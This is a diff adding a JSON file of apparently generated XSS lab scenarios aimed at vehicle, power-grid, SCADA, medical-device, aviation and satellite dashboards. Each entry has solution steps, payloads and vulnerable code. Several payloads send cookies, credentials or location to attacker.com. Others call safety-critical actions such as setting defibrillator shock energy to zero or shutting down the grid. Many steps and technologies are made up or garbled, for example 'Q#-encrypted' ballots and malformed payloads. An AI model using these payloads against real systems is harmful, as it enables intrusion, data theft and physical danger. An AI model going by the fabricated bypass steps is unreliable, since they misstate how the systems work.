@@ -1,0 +1,384 @@
+[
+    {
+      "Lab scenario": "DOM XSS in V2X (Vehicle-to-Everything) Message Rendering",
+      "Lab Description": "A smart city traffic system visualizes Basic Safety Messages (BSM) from connected vehicles using insecure innerHTML. The application parses SAE J2735 messages containing unsanitized vehicle IDs. To solve: Spoof BSM packets to inject XSS that triggers when traffic operators view collision warnings.",
+      "Difficulty Level": "Critical",
+      "Solution Steps": [
+        "Use OpenC2X to craft malicious BSM: vehicleId='<svg/onload=alert(`V2X_PWN`)>'",
+        "Bypass WAVE/DSRC header validation using certificate chain spoofing",
+        "Exploit Leaflet map popup sanitization bypass",
+        "Trigger through emergency vehicle approaching alerts"
+      ],
+      "Vulnerability name": "Cross-site scripting",
+      "payloads": [
+        "0012A4<script>navigator.sendBeacon('https://attacker.com', localStorage.secrets)</script>",
+        "{\"coreData\":{\"id\":\"\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E\"}}"
+      ],
+      "srcCode": "const parser = new J2735Parser();\nsocket.on('bsm', data => {\n  const bsm = parser.parse(data);\n  document.getElementById('vehicles').innerHTML += `<div>${bsm.id}</div>`;\n});"
+    },
+    {
+      "Lab scenario": "Stored XSS in EV Battery Management Firmware Portal",
+      "Lab Description": "An electric vehicle OEM portal stores battery cell voltage logs in MongoDB with disabled schema validation. The application's React frontend dangerously renders thermal runaway warnings. To solve: Inject XSS through CAN bus dumps that execute when engineers analyze charging patterns.",
+      "Difficulty Level": "High",
+      "Solution Steps": [
+        "Modify CANoe .blf logs: Cell_12_Temp = \"<img src=x onerror=alert('BMS_ACCESS')>\",",
+        "Bypass ISO 15118 signature validation via OCPP charge parameter manipulation",
+        "Exploit Material-UI Tooltip component XSS",
+        "Trigger through fast-charging simulation reports"
+      ],
+      "Vulnerability name": "Cross-site scripting",
+      "payloads": [
+        "CAN ID 0x3C<script>alert(1)</script> | 00 00 00 00",
+        "{\"soc\":\"80%\",\"notes\":\"</textarea><script>alert(1)</script>\"}"
+      ],
+      "srcCode": "app.post('/can', (req, res) => {\n  BatteryModel.updateOne({}, { $push: { logs: req.body.data } });\n});\n// Client:\ndangerouslySetInnerHTML={{ __html: canData }}"
+    },
+  
+    {
+        "Lab scenario": "DOM XSS in Real-Time Energy Distribution Dashboard",
+        "Lab Description": "A municipal power grid monitoring system reflects unsanitized substation IDs from URL parameters in its React dashboard. The application uses dangerouslySetInnerHTML for phasor measurement unit (PMU) labels. To solve: Inject XSS through crafted URL that triggers when engineers view load imbalance alerts.",
+        "Difficulty Level": "High",
+        "Solution Steps": [
+        "Intercept dashboard request with Burp Suite",
+        "Modify substation_id parameter: ?substation=<svg/onload='fetch(\"/grid-control?cmd=shutdown\")'>",
+        "Bypass CSP using AngularJS sandbox escape in legacy components",
+        "Trigger through SCADA protocol converter WebSocket"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "payloads": [
+        "https://grid.example.com/?substation=%3Cscript%3Ealert(document.domain)%3C/script%3E",
+        "<img src='x' onerror='new Image().src=`http://attacker.com?cookie=${btoa(document.cookie)}`'>"
+        ],
+        "srcCode": "app.get('/dashboard', (req, res) => {\n  res.render('index', { substationId: req.query.substation });\n});\n// Client:\ndocument.getElementById('pmu-label').innerHTML = substationId;"
+    },
+    {
+        "Lab scenario": "Stored XSS in Smart Meter Firmware Update Portal",
+        "Lab Description": "An utility company's firmware management system stores meter metadata in PostgreSQL without input validation. The Vue frontend renders device descriptions using v-html. To solve: Inject XSS through DLMS/COSEM protocol simulator that persists across firmware flashes.",
+        "Difficulty Level": "Critical",
+        "Solution Steps": [
+        "Use Postman to send malicious OBIS code: 1.0.31.7.0.255<script>alert('DEMAND_RESPONSE')</script>",
+        "Bypass IEC 62056-21 checksum validation using null-byte padding",
+        "Exploit firmware signature verification race condition",
+        "Trigger through automated DR (Demand Response) events"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "payloads": [
+        "{\"manufacturer\":\"SolarWatt\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E\"}",
+        "<meter id='x' onmouseover='alert(1)'></meter>"
+        ],
+        "srcCode": "app.post('/firmware', async (req, res) => {\n  await db.query('INSERT INTO meters (data) VALUES ($1)', [req.body]);\n});\n// Client:\n<template v-html=\"meterInfo\"></template>"
+    },
+    {
+        "Lab scenario": "Mutation XSS in SCADA Alarm Log Visualization",
+        "Lab Description": "A generation plant's HMI parses DNP3 protocol alarm messages into HTML tables. The application's XML-to-DOM converter fails to handle namespaces in SVG-based alerts. To solve: Craft malicious DNP3 object headers that mutate into scripts during refresh cycles.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+        "Use opendnp3 to forge ObjectHeader: 0x3C 0x73 0x63 0x72 (hex for <scr)",
+        "Complete payload: <![CDATA[</td><animate attributeName='href' values='javascript:alert(1)'/>]]>",
+        "Bypass DNP3 CRC validation using fragmented packets",
+        "Trigger through frequency excursion alarms"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "payloads": [
+        "<xml:namespace prefix=\"svg\"/><svg:script>alert('GRID_PWN')</svg:script>",
+        "<event xmlns:html='http://www.w3.org/1999/xhtml'><html:script>alert(1)"
+        ],
+        "srcCode": "app.post('/alarms', (req, res) => {\n  const parser = new xml2js.Parser();\n  parser.parseString(req.body, (err, result) => {\n    res.send(`<table>${result.alarms.map(a => `<tr>${a}</tr>`)}</table>`);\n  });\n});"
+    },
+    {
+        "Lab scenario": "Stored XSS in Renewable Energy Forecasting API",
+        "Lab Description": "A wind farm prediction system stores JSONP callback functions in Cassandra without validation. The application's admin panel dynamically creates script tags from stored entries. To solve: Inject XSS through malicious weather data callback that executes when meteorologists view forecasts.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+        "Craft API request: /api/forecast?callback=alert(document.cookie)",
+        "Bypass CORS using JSONP wrapping: /**/ typeof __xss__ === 'function' && __xss__({\"data\":...})",
+        "Exploit Protobuf deserialization order mismatch",
+        "Trigger through solar irradiance prediction widgets"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "payloads": [
+        "?callback=(()=>{window.location='https://attacker.com?exfil='+btoa(localStorage.credentials)})",
+        "?callback=coffeeScript.compile(`alert 'XSS'`)"
+        ],
+        "srcCode": "app.get('/forecast', (req, res) => {\n  res.setHeader('Content-Type', 'application/javascript');\n  res.send(`${req.query.callback}(${forecastData})`);\n});"
+    },
+    {
+        "Lab scenario": "DOM XSS in AMI (Advanced Metering Infrastructure) Headend",
+        "Lab Description": "A smart meter data collection system renders meter IDs from C12.22 protocol messages in Angular templates without sanitization. The application uses bypassSecurityTrustHtml for real-time usage displays. To solve: Spoof C12.22 ReadData responses containing XSS payloads.",
+        "Difficulty Level": "High",
+        "Solution Steps": [
+        "Use AMISim to generate malicious table data: <div [innerHTML]=\"userContent\">",
+        "Bypass C12.19 table validation using manufacturer-specific extensions",
+        "Exploit Angular template injection via {{constructor.constructor('alert(1)')()}}",
+        "Trigger through TOU (Time-of-Use) pricing updates"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "payloads": [
+        "{\"meterId\":\"{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}\"}",
+        "<div ng-app> {{ 'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//'); }} "
+        ],
+        "srcCode": "this.sanitizer.bypassSecurityTrustHtml(`<div>${meterData}</div>`);\n// Template:\n<div [innerHTML]=\"trustedHtml\"></div>"
+    },
+
+    {
+        "Lab scenario": "Stored XSS in Implantable Cardioverter-Defibrillator (ICD) Remote Monitoring",
+        "Lab Description": "A cardiac device management portal stores episode electrograms in MongoDB without input sanitization. The application's React frontend renders intracardiac signals using dangerouslySetInnerHTML. To solve: Inject XSS through spoofed ventricular tachycardia episodes that execute when cardiologists review arrhythmia logs.",
+        "Difficulty Level": "Critical",
+        "Solution Steps": [
+        "Use Medtronic CareLink simulator to send malicious episode data",
+        "Craft payload: EGM_Label=\"<svg/onload='fetch(`/api/icd-config?shock_energy=0`))'>\"",
+        "Bypass HL7 aECG schema validation using header injection",
+        "Trigger through remote device interrogation"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "payloads": [
+        "{\"episode\":\"<script>document.write('<iframe src=attacker.com></iframe>')</script>\"}",
+        "<img src='x' onerror='navigator.bluetooth.requestDevice({filters:[{services:[0x180d]}]'>"
+        ],
+        "srcCode": "app.post('/episodes', (req, res) => {\n  ICDModel.updateOne({ patientId }, { $push: { episodes: req.body } });\n});\n// Client:\n<div dangerouslySetInnerHTML={{ __html: episodeData }} />"
+    },
+    {
+        "Lab scenario": "DOM XSS in MRI Quench Detection System",
+        "Lab Description": "A superconducting magnet monitoring dashboard reflects cryogen levels from URL parameters in D3.js visualizations. The application uses innerHTML for emergency quench alerts. To solve: Inject XSS through crafted helium level parameter that triggers during magnet ramp-down sequences.",
+        "Difficulty Level": "High",
+        "Solution Steps": [
+        "Intercept quench alert request with OWASP ZAP",
+        "Modify level=78.3%3Cscript%3Ealert('QUENCH_OVERRIDE')%3C/script%3E",
+        "Bypass CSP using SVG foreignObject injection",
+        "Trigger through automated safety system tests"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "payloads": [
+        "https://mri.example.com?helium=<svg/onload='document.body.innerHTML+=`<img src=http://attacker.com?${btoa(localStorage.creds)}>`>",
+        "<math><maction actiontype='statusline#http://attacker.com'></maction>"
+        ],
+        "srcCode": "const params = new URLSearchParams(location.search);\ndocument.getElementById('cryo-level').innerHTML = params.get('helium');"
+    },
+    {
+        "Lab scenario": "Mutation XSS in Smart Insulin Pump Configuration Portal",
+        "Lab Description": "A diabetes management system parses basal rate schedules from XML without proper namespace handling. The application's Angular template renders therapy plans using bypassSecurityTrustHtml. To solve: Inject XSS through malicious basal rate entries that execute during bolus calculator usage.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+        "Use OmniPod PDM emulator to submit schedule: <xhtml:script>alert(1)",
+        "Bypass XML schema validation using ambiguous namespace prefixes",
+        "Exploit AngularJS ng-bind-html directive sanitizer bypass",
+        "Trigger through temporary basal rate activations"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "payloads": [
+        "<basalrates xmlns:html='http://www.w3.org/1999/xhtml'><html:script>alert(1)</html:script>",
+        "<!--<script>alert('INSULIN_OVERDOSE')</script>-->"
+        ],
+        "srcCode": "this.sanitizer.bypassSecurityTrustHtml(`<div>${basalSchedule}</div>`);\n// Template:\n<div [innerHTML]=\"trustedHtml\"></div>"
+    },
+    {
+        "Lab scenario": "Stored XSS in DICOM Radiation Therapy Planning System",
+        "Lab Description": "An oncology treatment platform stores RTSTRUCT DICOM files with unescaped ROI names. The application renders structure sets in Three.js using innerHTML for tooltips. To solve: Inject XSS through malicious ROI annotations that execute during dose-volume histogram analysis.",
+        "Difficulty Level": "High",
+        "Solution Steps": [
+        "Use pydicom to modify (3006,0026) ROI Name: \"<img src=x onerror=alert('DOSE_SABOTAGE')>\",",
+        "Bypass DICOM VR (LO) 64-char limit using continuation sequences",
+        "Exploit WebGL shader error message concatenation",
+        "Trigger through plan comparison workflows"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "payloads": [
+        "(3006,0026) LO = \"\\u0000<script>alert(1)</script>\"",
+        "<g onbegin=\"alert(1)\"><animate attributeName=\"x\" dur=\"1s\"/></g>"
+        ],
+        "srcCode": "app.get('/rtstruct', (req, res) => {\n  const ds = dcmjs.data.DicomMessage.readFile(req.file.path);\n  res.render('viewer', { rois: ds.ROIContourSequence });\n});"
+    },
+    {
+        "Lab scenario": "DOM XSS in Patient-Controlled Analgesia (PCA) Pump Log Viewer",
+        "Lab Description": "A pain management system reflects unsanitized drug names from URL parameters in its Vue interface. The application uses v-html for medication history timelines. To solve: Inject XSS through crafted drug parameter that triggers when nurses review administration records.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+        "Intercept medication search with Burp Suite",
+        "Modify drug=Fentanyl%3Cscript%3Ealert('PCA_OVERRIDE')%3C/script%3E",
+        "Bypass Vue sanitization using prototype pollution",
+        "Trigger through shift change report generation"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "payloads": [
+        "?drug=__proto__[innerHTML]=<script>alert(1)</script>",
+        "<div v-html=\"userInput\"></div>"
+        ],
+        "srcCode": "new Vue({\n  el: '#app',\n  data: { drug: new URLSearchParams(location.search).get('drug') },\n  template: `<div v-html=\"drug\"></div>`\n});"
+    },
+        
+    {
+        "Lab scenario": "DOM XSS in FADEC Ground Station Telemetry Dashboard",
+        "Lab Description": "A jet engine monitoring system reflects unsanitized EGT (Exhaust Gas Temperature) values from WebSocket streams. The application uses innerHTML for real-time parameter alerts. To solve: Inject XSS through spoofed CAN bus messages that execute when engineers view overspeed warnings.",
+        "Difficulty Level": "Critical",
+        "Solution Steps": [
+        "Use ARINC 664 simulator to craft malicious parameter: EGT= <svg/onload='fetch(\"/api/engine-control?thrust=120%\")'>",
+        "Bypass ARINC 429 label validation using bus snooping",
+        "Exploit Three.js CSS2DRenderer text handling",
+        "Trigger through engine stall test mode"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "payloads": [
+        "{\"n1\":\"95%3Cscript%3Ealert('FADEC_OVERRIDE')%3C/script%3E\"}",
+        "<math><maction actiontype='statusline#xss'>alert(1)</maction>"
+        ],
+        "srcCode": "const ws = new WebSocket('ws://fadec:9090');\nws.onmessage = e => {\n  document.getElementById('egt-display').innerHTML = \n    `<span>${JSON.parse(e.data).egt}</span>`;\n};"
+    },
+    {
+        "Lab scenario": "Stored XSS in ADS-B Aircraft Tracking System",
+        "Lab Description": "An air traffic control platform stores aircraft registration data in PostgreSQL without input validation. The Vue frontend renders ICAO 24-bit addresses using v-html. To solve: Spoof Mode-S transponder messages containing XSS that triggers when controllers click aircraft icons.",
+        "Difficulty Level": "High",
+        "Solution Steps": [
+        "Use dump1090 to broadcast malicious registration: A7-FUZZ<script>alert('TCAS_PWN')</script>",
+        "Bypass ICAO Annex 10 checks using squawk code injection",
+        "Exploit OpenLayers popup sanitization bypass",
+        "Trigger through conflict alert resolution advisories"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "payloads": [
+        "{\"flight\":\"AA123\",\"hex\":\"<img src=x onerror='navigator.geolocation.getCurrentPosition(e=>fetch(`http://attacker.com?pos=${e.coords}`))'>\"}",
+        "%%x%%3Cscript%%x%%3Ealert(1)%%x%%3C/script%%x%%3E"
+        ],
+        "srcCode": "app.post('/adsb', async (req, res) => {\n  await db.query('INSERT INTO flights VALUES ($1)', [req.body.hex]);\n});\n// Client:\n<div v-html=\"flight.hex\"></div>"
+    },
+    {
+        "Lab scenario": "Mutation XSS in Satellite Telecommand Interface",
+        "Lab Description": "A spacecraft command system parses CCSDS telecommand packets into XML without proper namespace isolation. The application's Electron-based UI uses dangerouslySetInnerHTML for command histories. To solve: Inject XSS through malicious TC packets that execute during solar array deployment sequences.",
+        "Difficulty Level": "High",
+        "Solution Steps": [
+        "Use SatNOGS to transmit packet: <COMMAND NAME=\"<script>alert('ATTITUDE_CHANGE')</script>\"",
+        "Bypass COP-1 protocol validation using bypass lock",
+        "Exploit XSLT stylesheet injection in telemetry displays",
+        "Trigger through momentum wheel desaturation events"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "payloads": [
+        "<![CDATA[</sp/><script>alert(1)</script>]]>",
+        "<xml:namespace prefix=\"html\"/><html:script>alert(1)"
+        ],
+        "srcCode": "const parser = new CCSDS.PacketParser();\nparser.on('packet', pkt => {\n  mainWindow.webContents.send('command', pkt.data);\n});\n// Renderer:\ndocument.getElementById('history').innerHTML += cmd;"
+    },
+    {
+        "Lab scenario": "DOM XSS in Aviation Maintenance EHR Integration",
+        "Lab Description": "An aircraft health management system reflects unsanitized part numbers from URL parameters in its AngularJS interface. The application uses $sce.trustAsHtml for maintenance log rendering. To solve: Inject XSS through crafted MSG-3 task codes that execute when technicians view component histories.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+        "Intercept parts lookup request with Burp Suite",
+        "Modify pn=MSN456%3Cscript%3Ealert('EHR_PHI_LEAK')%3C/script%3E",
+        "Bypass AngularJS sandbox using charAt override",
+        "Trigger through airworthiness directive compliance checks"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "payloads": [
+        "{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}",
+        "<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}} "
+        ],
+        "srcCode": "app.controller('MainCtrl', function($scope, $sce) {\n  $scope.partNumber = $sce.trustAsHtml($routeParams.pn);\n});\n<!-- Template -->\n<div ng-bind-html=\"partNumber\"></div>"
+    },
+    {
+        "Lab scenario": "Stored XSS in Flight Planning API Gateway",
+        "Lab Description": "An EFB (Electronic Flight Bag) system stores flight plans in Redis without input validation. The React frontend renders ICAO flight plan fields using dangerouslySetInnerHTML. To solve: Inject XSS through malicious route remarks that execute when pilots file revised plans.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+        "Use Postman to send FIR/ route: -SCRIPT<script>alert('FLIGHT_REROUTE')</script>",
+        "Bypass EUROCONTROL AFTN message validation via SID/STAR injection",
+        "Exploit NOTAM text-to-speech conversion flaws",
+        "Trigger through collaborative flight planning"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "payloads": [
+        "{\"route\":\"KLAX..<svg/onload='console.log(\\\"JEPPESEN_DATA\\\")'>..RJAA\"}",
+        "RMK/ <img src=x onerror='new AudioContext().createScriptProcessor(4096,1,1)'>"
+        ],
+        "srcCode": "app.post('/flightplan', (req, res) => {\n  redisClient.set(req.body.id, JSON.stringify(req.body));\n});\n// Client:\n<div dangerouslySetInnerHTML={{ __html: plan.remarks }} />"
+    },
+              
+    {
+        "Lab scenario": "DOM XSS in Metaverse Avatar Profile Rendering",
+        "Lab Description": "A WebXR social platform renders 3D avatar bios using Babylon.js without sanitizing NFT metadata. The application converts on-chain ERC-6551 tokens to HTML panels using innerHTML. To solve: Inject XSS through malicious tokenURI that executes when users inspect virtual goods.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+        "Mint NFT with description: <x3d><script>alert('VR_SESSION')</script>",
+        "Bypass IPFS CID validation using base36 polyglots",
+        "Exploit WebGL shader error handling",
+        "Trigger through avatar inventory sharing"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "payloads": [
+        "data:application/x3d+xml,<Script><![CDATA[alert(document.cookie)]]></Script>",
+        "<model><body onload='javascript:alert(1)'/>"
+        ],
+        "srcCode": "async loadAvatar(tokenId) {\n  const metadata = await ERC6551.getMetadata(tokenId);\n  document.getElementById('bio').innerHTML = metadata.description;\n}"
+    },
+    {
+        "Lab scenario": "Stored XSS in Quantum-Secure Voting System",
+        "Lab Description": "A post-quantum e-voting platform stores ballot comments in Q#-encrypted blobs without input validation. The React frontend decrypts and renders using dangerouslySetInnerHTML. To solve: Inject XSS through lattice-based ciphertext that persists through homomorphic tallying.",
+        "Difficulty Level": "High",
+        "Solution Steps": [
+        "Use MLWE ciphertext manipulator to encode payload",
+        "Craft comment: \\u003Cscript\\u003Ealert('ELECTION_PWN')\\u003C/script\\u003E",
+        "Bypress NIST PQC standardization checks using FrodoKEM parameter confusion",
+        "Trigger through result audit processes"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "payloads": [
+        "CRYSTALS-KYBER-768:<svg/onload='fetch(\"/api/ballots?decrypt=true\")'>",
+        "SIKEp503_COMPRESSED<script>alert(1)</script>"
+        ],
+        "srcCode": "const plaintext = qsharp.decrypt(ciphertext, privateKey);\ndocument.getElementById('comment').innerHTML = plaintext;"
+    },
+    {
+        "Lab scenario": "Mutation XSS in Vertical Farm IoT Dashboard",
+        "Lab Description": "A hydroponic control system parses Modbus sensor data into SVG growth charts. The application's Angular template bypasses sanitization for real-time EC/pH displays. To solve: Inject XSS through nutrient dosing parameters that execute during automated flush cycles.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+        "Use PLCsim to spoof sensor: EC=5.8<animate attributeName='href' values='javascript:alert(1)'/>",
+        "Bypass ISA-88 batch validation using phase injection",
+        "Exploit D3.js transition.on('end') handlers",
+        "Trigger through CO2 enrichment system alerts"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "payloads": [
+        "<set attributeName='onclick' to='alert(\"NUTRIENT_OVERRIDE\")'/>",
+        "pH:7.2<foreignObject><script>document.write('<iframe src=attacker.com>')"
+        ],
+        "srcCode": "this.sanitizer.bypassSecurityTrustHtml(`<svg>${sensorData}</svg>`);\n// Template:\n<div [innerHTML]=\"trustedSVG\"></div>"
+    },
+    {
+        "Lab scenario": "DOM XSS in Space Tourism Booking Portal",
+        "Lab Description": "A lunar travel agency's payment system reflects unsanitized promo codes from URL parameters. The Vue/Nuxt frontend uses v-html for limited-time offer banners. To solve: Inject XSS through crafted discount code that executes during launch window selection.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+        "Intercept checkout request with Burp Suite",
+        "Modify promo=MOON25%3Cscript%3Ealert('BOOKING_PWN')%3C/script%3E",
+        "Bypass CSP using WebAssembly.instantiate streaming",
+        "Trigger through seat map rendering"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "payloads": [
+        "?promo=SPACE2024<svg/onload='navigator.credentials.get({otp:true})'>",
+        "<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)')}} "
+        ],
+        "srcCode": "export default {\n  asyncData({ query }) {\n    return { promo: query.discount }\n  },\n  template: `<div v-html=\"promo\"></div>`\n}"
+    },
+    {
+        "Lab scenario": "Stored XSS in DAO Governance Proposal Renderer",
+        "Lab Description": "A decentralized autonomous organization stores Snapshot proposals in IPFS without sanitization. The Svelte frontend renders Markdown with mdsvex using raw HTML enabled. To solve: Inject XSS through proposal body that executes when delegates vote on-chain.",
+        "Difficulty Level": "Hard",
+        "Solution Steps": [
+        "Craft proposal: [XSS](javascript&#58;alert('TREASURY_DRAIN'))",
+        "Bypass IPFS CID filtering using unified diff patches",
+        "Exploit ENS reverse resolution in delegate displays",
+        "Trigger through vote delegation smart contract calls"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "payloads": [
+        "```html\n<template shadowroot><script>alert(1)</script>",
+        "---\ntitle: Proposal\n---\n<script>window.ethereum.send('eth_sendTransaction', ...)</script>"
+        ],
+        "srcCode": "const html = compileMarkdown(ipfsContent);\ndocument.getElementById('proposal').innerHTML = html;"
+    }
+                  
+              
+          
+    
+  ]
